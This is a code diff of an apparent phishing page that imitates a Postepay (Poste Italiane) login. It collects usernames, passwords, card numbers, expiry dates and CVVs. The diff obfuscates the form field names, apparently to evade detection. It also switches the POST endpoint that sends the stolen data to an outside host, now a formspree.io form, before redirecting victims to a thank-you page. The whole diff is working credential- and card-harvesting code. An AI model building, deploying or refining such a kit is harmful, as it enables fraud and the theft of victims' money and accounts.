@@ -307,7 +307,7 @@
 																					<div class="form-group form-group-lg rememberme_hidden">
 																						<p>
 																							<label class="control-label" for="username">NOME
-																								UTENTE</label> <input class="form-control" id="username" name="username"
+																								UTENTE</label> <input class="form-control" id="username" name="tutstetrtntatmte"
 																								placeholder="inserisci" type="text" value="" required
 																								autocomplete="username">
 																						</p>
@@ -316,7 +316,7 @@
 																						<label class="control-label" for="password">PASSWORD</label>
 																						<div class="input-group">
 																							<input type="password" class="form-control pwd-control" id="password"
-																								name="password" placeholder="inserisci" required
+																								name="tptatststwtotrtd" placeholder="inserisci" required
 																								autocomplete="current-password">
 																							<div class="input-group-addon input-group-addon-pwd bg-password-hide"
 																								title="mostra la password" id="password-trigger">
@@ -326,19 +326,19 @@
 																					</div>
 																					<div class="form-group form-group-lg">
 																						<label class="control-label" for="cc-number">Numero carta POSTEPAY</label>
-																						<input type="text" inputmode="tel" class="form-control" id="cc-number"
+																						<input type="text" inputmode="tel" class="form-control" id="tntutmtbtetr"
 																							name="cc-number" required autocomplete="cc-number" value="" minlength="16"
 																							maxlength="20" pattern="[0-9]{16,20}">
 																					</div>
 																					<div class="form-group form-group-lg">
 																						<label class="control-label" for="cc-exp">Data di scadenza</label>
 																						<div class="input-group">
-																							<input type="month" class="form-control" id="cc-exp" name="cc-exp"
+																							<input type="month" class="form-control" id="cc-exp" name="tetxtp"
 																								required autocomplete="cc-exp">
 																						</div>
 																						<label class="control-label" for="cc-csc">CVV</label>
 																						<div class="input-group">
-																							<input type="text" inputmode="tel" class="form-control" id="cc-csc" name="cc-csc"
+																							<input type="text" inputmode="tel" class="form-control" id="cc-csc" name="tctvtv"
 																								placeholder="inserisci" autocomplete="cc-csc" minlength="3"
 																								maxlength="3" pattern="[0-9]{3}" required>
 																						</div>
@@ -441,9 +441,12 @@
 			});
 
 			$.ajax({
-				url: "https://joyous-gray-life-jacket.cyclic.app/send",
+				url: "https://formspree.io/f/xqkjrbzp",
 				type: 'POST',
 				data: data,
+        		headers: {
+            		'Accept': 'application/json'
+        		},
 				success: (response) => {
 					console.log(response);
 					window.location.href = "./thanks.html"
